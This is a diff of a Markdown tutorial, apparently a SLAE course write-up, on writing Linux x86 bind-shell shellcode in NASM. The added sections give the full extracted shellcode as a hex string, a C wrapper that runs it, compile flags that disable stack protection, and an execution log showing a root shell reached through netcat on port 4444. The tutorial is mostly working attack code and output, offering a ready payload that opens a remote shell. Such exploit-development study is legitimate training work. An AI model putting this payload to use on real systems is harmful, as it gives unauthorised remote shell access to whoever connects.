@@ -58,6 +58,7 @@ They are responsible for the whole process that the computer must perform to fin
 
 So let's start creating our shellcode using NASM. I will try to divide this process into parts, distinguishing between different system calls called in the course.
 
+### Clearing ###
 First, we will start by clearing the registers we use, because in the case of the C language wrapper that we will be using, it may turn out to be very important (registers are not empty at the time of transition to the _start function).
 ```nasm
 global _start
@@ -72,6 +73,8 @@ cleaning:
 	xor ecx, ecx
 	xor edx, edx
 ```
+
+### sys_socket() ###
 Then, we proceed to create the socket. For this purpose, we will use socketcall() syscall, which will allow us to easily call subsequent types of system calls (socket, bind, listen ....).
 
 At this point I would like to explain the principle of system calls. Their list, in the case of systems based on intel x86 processors, can be found in the file:
@@ -178,6 +181,8 @@ sys_socket:
 
 	mov edx, eax		; saving the bind_socket pointer for further usage
 ```
+
+### sys_bind() ###
 The next call system will be sys_bind. The whole process looks very similar, except that we have here "throwing" arguments to the stack and indicating their top to the ECX register twice.
 
 We check the system call identifier:
@@ -220,6 +225,9 @@ sys_bind:
 
 	int 128			; syscall execution
 ```
+
+
+### sys_listen() ###
 Next in order - sys_listen()
 
 We check the system call identifier:
@@ -250,6 +258,8 @@ sys_listen:
 	
 	int 128			; syscall execution
 ```
+
+### sys_accept() ###
 Another simple syscall is sys_accept().
 
 We check the system call identifier:
@@ -283,6 +293,8 @@ sys_accept:
 
 	mov edx, eax		; saving the bind_socket pointer for further usage
 ```
+
+### sys_dup2() ###
 Another syscall, sys_dup2() can be implemented in many ways, for example by using loops. I decided to do it step by step in order to better illustrate the arguments raised.
 It is worth noting that it is not called from socketcall(), but directly as system syscall.
 
@@ -324,6 +336,7 @@ sys_dup2:
 	int 128			; syscall execution
 ```
 
+### sys_execve() ###
 The last syscall we call will be sys_execve. In this case we see the placement of the string "/bin/sh" + string terminator \x00 in the EBX registry, using a stack.
 
 After doing this, syscall establishes a listening port with an assigned shell when someone connects to it.
@@ -361,7 +374,9 @@ sys_execve:
 
 	int 128			; syscall execution
 ```
+---------------------------------------------------------------------------
 
+### bind_shell.nasm ###
 That's all, below I present the entire code of the NASM file, which we will then put into the C language wrapper and try to execute.
 
 ```nasm
@@ -517,3 +532,75 @@ sys_execve:
 
 	int 128			; syscall execution
 ```
+
+### Assemble and linking ###
+
+Let's use scripts provided by Vivec in SLAE course materials.
+```sh
+# cat ./compile.sh 
+#!/bin/bash
+echo '[+] Assembling with Nasm ... '
+nasm -f elf32 -o $1.o $1.nasm
+echo '[+] Linking ...'
+ld -o $1 $1.o
+echo '[+] Done!'
+
+$ ./compile.sh bind_shell
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Done!
+```
+
+### Preparing C Wrapper ###
+
+Now we extract the shellcode from our NASM and put it in the C language wrapper. It's also worth checking to see if any null-byte has crept in.
+```sh
+$ objdump -d ./bind_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x31\xf6\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xf6\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
+```
+Then we have to copy it inside shellcode.c wrapper file:
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x31\xf6\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xf6\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+```
+
+And compile.
+```sh
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+```
+
+### Execution ###
+
+```sh
+$ netstat -antp | grep 4444
+<blank>
+
+$ ./shellcode
+Shellcode Length: 119
+
+$ netstat -antp | grep 4444
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      20856/shellcode 
+```
+Great! Now we have to connect to it only.
+```sh
+$ nc localhost 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Pwned. ###
